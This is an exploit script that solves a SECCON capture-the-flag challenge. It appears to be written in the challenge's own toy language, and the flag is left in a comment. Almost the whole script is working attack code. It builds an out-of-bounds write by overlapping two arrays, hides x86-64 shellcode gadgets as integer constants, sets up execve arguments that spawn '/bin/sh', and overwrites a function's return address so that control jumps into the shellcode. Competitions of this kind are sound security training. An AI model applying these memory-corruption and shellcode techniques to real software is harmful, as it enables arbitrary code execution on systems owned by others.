def make_foo():
    return array(0xffff)


def make_bar():
    return array(0)


def pwn():
    foo = make_foo()
    bar = make_bar()
    # foo overlaps bar's header, adjust bar's size
    foo[0xfffe] = foo[0xfffe] | 0xfffffff
    # shellcode
    pwn0 = 0x04eb5858  # pop rax; pop rax; jmp next
    pwn1 = 0x04eb5e5f  # pop rdi; pop rsi; jmp next
    pwn2 = 0x050f5a  # pop rdx; syscall
    # change pwn()'s return address from main to shellcode
    bar[9] = bar[9] - 0x28d


def main():
    arr = array(7)
    arr[0] = 59  # rax=__NR_execve
    arr[1] = arr + 8 + 4 * 8  # rdi=pathname
    arr[2] = arr + 8 + 5 * 8  # rsi=argv
    arr[3] = arr + 8 + 6 * 8  # rdx=envp
    arr[4] = 0x6e69622f | (0x68732f * 0x10000 * 0x10000)
    arr[5] = arr[1]  # argv=[pathname, 0]
    arr[6] = 0  # envp=[0]
    pwn()
    # SECCON{Please DM ptr-yudai if U solved this without array}
